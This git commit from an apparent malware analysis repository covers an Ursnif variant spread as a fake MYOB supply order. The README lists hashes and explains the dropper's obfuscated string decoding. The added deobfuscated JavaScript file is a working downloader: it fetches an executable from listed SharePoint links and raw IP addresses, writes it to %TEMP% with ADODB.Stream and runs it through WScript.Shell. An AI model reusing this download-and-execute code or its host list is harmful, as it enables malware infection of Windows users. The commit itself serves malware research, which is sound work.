e7586b5d2fd7512d7ace84c09cb8a3d3956e9fa3
Fare9 <eduardo.blazquez@edu.uah.es>
2017-11-30 17:09:41 +0100

    New files from analysis

--- README.md
+++ README.md
@@ -1,2 +1,84 @@
 # YourMYOBSupply_Order
 Analysis of new Ursnif variant which employs Malicious TLS Callback to achieve Process Injection
+
+
+# Files, Hashes and URLs
+
+## YourMYOBSupply_Order.zip
+
+* SHA256: 772bc1ae314dcea525789bc7dc5b41f2d4358b755ec221d783ca79b5555f22ce
+* VirusTotal: https://www.virustotal.com/#/file/772bc1ae314dcea525789bc7dc5b41f2d4358b755ec221d783ca79b5555f22ce/detection
+
+## Your_MYOB_Supply_Order.js
+
+* SHA256: 9f7413a57595ffe33ca320df26231d30a521596ef47fb3e3ed54af1a95609132
+* VirusTotal: https://www.virustotal.com/#/file/9f7413a57595ffe33ca320df26231d30a521596ef47fb3e3ed54af1a95609132/detection
+
+## clients.7z
+
+* SHA256: e498b56833da8c0170ffba4b8bcd04f85b99f9c892e20712d6c8e3ff711fa66c
+* VirusTotal: https://www.virustotal.com/#/file/e498b56833da8c0170ffba4b8bcd04f85b99f9c892e20712d6c8e3ff711fa66c/detection
+
+
+# Behaviour
+
+Malware starts with zip file <a href="./YourMYOBSupply_Order.zip">YourMYOBSupply_Order.zip</a>, so we had to unzip in our desktop for example.
+Inside of the output folder, we've found a file dubbed YourMYOBSupply_Order.js as you can see in <a href="./Your_MYOB_Supply_Order.js">Your_MYOB_Supply_Order.js</a>
+this javascript file is ofuscated with variables rename technique, and string ciphered method, it uses this method to decipher:
+
+```Javascript
+function String.prototype.dva(){ var u0zUnq='';
+var qRatq1N='F';var R8pAJyZI=N89mpis97-hyYhDTXbWVs;var JqGGXMMv9=this.split(u0zUnq);var JNBVcUPJxh='0';jPAzrTcHGv=vuja(JqGGXMMv9);YHg6e5lbOG=u0zUnq; if(BCHXYwu[(4-1)+jPAzrTcHGv].length==8/2){var RuVFYb=YHg6e5lbOG;for(var i=0;i<jPAzrTcHGv/6;i++) { YHg6e5lbOG=JqGGXMMv9[i];if ((YHg6e5lbOG<=qRatq1N)&&(YHg6e5lbOG>=JNBVcUPJxh)) { if (((((0x755096e>>0x20)*(0x231238856f4a6800/0x231238856f4a6800)+(0x155ed24>>1))>>>(0x1b<<32))+RuVFYb.length)>(4/4)) {IxdhAELZKon=fule(RuVFYb+YHg6e5lbOG); RuVFYb='';u0zUnq=u0zUnq+kigy(IxdhAELZKon);} else { RuVFYb=YHg6e5lbOG; } } } } return u0zUnq; }
+```
+
+If we deofuscate this method, we have something like this:
+
+```Javascript
+function String.prototype.dva()
+{ 
+	var u0zUnq='';
+
+	var qRatq1N='F';
+	var R8pAJyZI=N89mpis97-hyYhDTXbWVs;
+	var JqGGXMMv9=this.split(u0zUnq);
+	var JNBVcUPJxh='0';
+	jPAzrTcHGv=func_retorna_length_2_3(JqGGXMMv9);
+	YHg6e5lbOG=u0zUnq;
+	 if(BCHXYwu[(4-1)+jPAzrTcHGv].length==8/2){
+		var RuVFYb=YHg6e5lbOG;
+			for(var i=0;i<jPAzrTcHGv/6;i++) { 
+			YHg6e5lbOG=JqGGXMMv9[i];
+				if ((YHg6e5lbOG<=qRatq1N)&&(YHg6e5lbOG>=JNBVcUPJxh)) { 
+					if ((((123013486*1+11204242)>>>27)+RuVFYb.length)>1) {
+						IxdhAELZKon=func_retorna_num_base_16(RuVFYb+YHg6e5lbOG);
+						RuVFYb='';
+						u0zUnq=u0zUnq+return_char_from_int(IxdhAELZKon);
+					} else { 
+						RuVFYb=YHg6e5lbOG;
+					} 
+				} 
+			} 
+		} 
+	return u0zUnq;
+}
+```
+
+The behaviour of the javascript is to connect with one of three servers to download a 7zip file, really this 7zip file is an executable MZ, as we can see here:
+
+```Javascript
+if (ycz4qOT&&ycz4qOT=="OK") { 
+	if (IsESHwrjqQe8<1) {
+		var response_server = pyuU9XIy["responseText"];
+
+		var P4eTJ3 = response_server.split('');
+		if (P4eTJ3[0]+P4eTJ3[1]=="MZ") { 
+			flag=1;
+		} 
+	}
+	else { 
+		flag=1;
+	 } 
+} 
+```
+
+It's checking if the first two bytes of the header have the letters 'M' and 'Z' from the executable header of Microsoft.
---
+++ YourMYOBSupply_Order_deofuscated.js
@@ -0,0 +1,144 @@
+N89mpis97=2;		
+BCHXYwu=[]; 
+
+var siiZOa=1000;		
+var DthBlp2_g5=0; 
+
+siiZOa=siiZOa*(((~-504599708)*(0x1<<0x20)+(1672588692>>2))>>>(0x5800000>>>0x16))*N89mpis97;  
+var wJrHl5JovDg=' ';  
+
+qPNZcLE_Kjc=""+new  Date(); 
+hyYhDTXbWVs=2;	
+
+while(siiZOa>(((0x4364*0x1+0x89c)>>(0x280000>>>0x12))%(1<<32)))
+{
+	tfim7kdnv1vc=qPNZcLE_Kjc.split(wJrHl5JovDg);
+	BCHXYwu.push(tfim7kdnv1vc[siiZOa%(5+1)]);
+	siiZOa=siiZOa-1
+}
+
+ExpandEnvironmentString_='ExpandEnvironmentString'; 
+
+ActiveObjectX=this["ActiveXObject"];
+
+
+URLs=["https://drafthouse-my.sharepoint.com/personal/charlotte_drafthouse_co_uk/_layouts/15/guestaccess.aspx?docid=0c9abd819d513458a91fb80a36f4e286c&authkey=AU4nLQjX0Cp5F_0-T0BoDhY",
+		"https://succeedconsultancyltd-my.sharepoint.com/personal/stewart_cobley_succeed_co_uk/_layouts/15/guestaccess.aspx?docid=0eb72f87635184be183a8eb7e073c137b&authkey=AY7s3F0-TqTKRLYQRI8vlEE",
+		"http://188.165.214.64/clients/clients.7z"];
+
+
+
+WScript_Shell=new ActiveObjectX("WScript.Shell");
+
+
+Run_String="Run";
+
+
+temporal_path=WScript_Shell[ExpandEnvironmentString_]("%TEMP%/BRTNtXa.exe");
+
+var IsESHwrjqQe8=DthBlp2_g5;	
+  
+try{
+	while(IsESHwrjqQe8<2){
+		if (IsESHwrjqQe8==1){
+			URLs=["http://91.121.66.10/xero/Xero-invoice.pdf","http://94.23.11.98/docusign/Your_MYOB_Supply_Order.pdf"];
+			temporal_path=WScript_Shell[ExpandEnvironmentString_]("%TEMP%/FYZcLcX.pdf");
+		}
+		var url_index=14-7*N89mpis97;	
+		pyuU9XIy=new ActiveObjectX("MSXML2.XMLHTTP");	
+		flag=DthBlp2_g5;	
+		while(flag==0){
+
+			pyuU9XIy["open"]("GET",URLs[url_index], false);
+
+			++url_index;
+			if (url_index==URLs.length) 
+				url_index=0;
+			
+
+			pyuU9XIy["send"]();
+
+
+			while(pyuU9XIy["readystate"]<(N89mpis97+hyYhDTXbWVs)){
+				WScript_Shell["sleep"](100);
+			}
+
+
+			ycz4qOT=pyuU9XIy["statusText"];
+
+
+			if (ycz4qOT&&ycz4qOT=="OK") { 
+				if (IsESHwrjqQe8<1) {
+					var response_server = pyuU9XIy["responseText"];
+
+					var P4eTJ3 = response_server.split('');
+					if (P4eTJ3[0]+P4eTJ3[1]=="MZ") { 
+						flag=1;
+					} 
+				}
+				else { 
+					flag=1;
+				 } 
+			} 
+		}
+		
+		IsESHwrjqQe8++;
+		Fgg3R5=new ActiveObjectX("ADODB.Stream");
+		Fgg3R5["open"]();
+		Fgg3R5["type"]=N89mpis97-1;
+
+		Fgg3R5["write"](pyuU9XIy["ResponseBody"]);
+		Fgg3R5["position"]=N89mpis97-hyYhDTXbWVs;
+		Fgg3R5["saveToFile"](temporal_path,hyYhDTXbWVs);
+
+		Fgg3R5["close"]();
+		WScript_Shell[Run_String](temporal_path,(0,hyYhDTXbWVs-N89mpis97);
+		}
+} catch(OaCbRkgFni3D){}
+ 
+function return_char_from_int(str){
+	var SJs0cm=(((0x3580000>>18)<<(8*4))%(~-2));
+	var u2YGhCgJ5="";
+	var StoJgYFSzY=String.fromCharCode(str);
+
+	for(T5eEMCBE=0;T5eEMCBE<100;T5eEMCBE++){
+		SJs0cm=SJs0cm+1;
+	};
+	return StoJgYFSzY;
+}
+
+function String.prototype.dva()
+{ 
+	var u0zUnq='';
+
+	var qRatq1N='F';
+	var R8pAJyZI=N89mpis97-hyYhDTXbWVs;
+	var JqGGXMMv9=this.split(u0zUnq);
+	var JNBVcUPJxh='0';
+	jPAzrTcHGv=func_retorna_length_2_3(JqGGXMMv9);
+	YHg6e5lbOG=u0zUnq;
+	 if(BCHXYwu[(4-1)+jPAzrTcHGv].length==8/2){
+		var RuVFYb=YHg6e5lbOG;
+			for(var i=0;i<jPAzrTcHGv/6;i++) { 
+			YHg6e5lbOG=JqGGXMMv9[i];
+				if ((YHg6e5lbOG<=qRatq1N)&&(YHg6e5lbOG>=JNBVcUPJxh)) { 
+					if ((((123013486*1+11204242)>>>27)+RuVFYb.length)>1) {
+						IxdhAELZKon=func_retorna_num_base_16(RuVFYb+YHg6e5lbOG);
+						RuVFYb='';
+						u0zUnq=u0zUnq+return_char_from_int(IxdhAELZKon);
+					} else { 
+						RuVFYb=YHg6e5lbOG;
+					} 
+				} 
+			} 
+		} 
+	return u0zUnq;
+}
+
+function func_retorna_length_2_3(num){
+	return num.length*2*3;
+}
+
+function func_retorna_num_base_16(ch){
+	return parseInt(ch,16);
+}
